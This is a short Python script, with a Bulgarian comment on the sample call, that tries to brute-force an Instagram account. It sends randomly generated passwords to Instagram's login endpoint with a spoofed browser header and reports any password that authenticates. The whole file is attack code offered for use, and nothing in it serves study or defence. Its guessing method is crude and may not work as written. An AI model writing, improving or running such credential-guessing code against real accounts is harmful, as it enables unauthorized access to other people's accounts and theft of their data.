import requests
import random
import string

def generate_random_password(length=8):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for i in range(length))

def brute_force_instagram(username, max_attempts=1000, password_length=8):
    url = "https://www.instagram.com/accounts/login/ajax/"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "X-CSRFToken": "missing",
        "Referer": "https://www.instagram.com/accounts/login/",
    }
    
    session = requests.Session()
    
    for attempt in range(max_attempts):
        password = generate_random_password(password_length)
        payload = {
            "username": username,
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{password}",
            "queryParams": "{}",
            "optIntoOneTap": "false"
        }
        
        response = session.post(url, data=payload, headers=headers)
        
        if "authenticated\": true" in response.text:
            print(f"[SUCCESS] Password found: {password}")
            return True
        else:
            print(f"[FAILED] Tried password: {password} (Attempt {attempt + 1}/{max_attempts})")

    print("Password not found within the specified attempts")
    return False

# Примерен вход
brute_force_instagram("your_username", max_attempts=100, password_length=10)
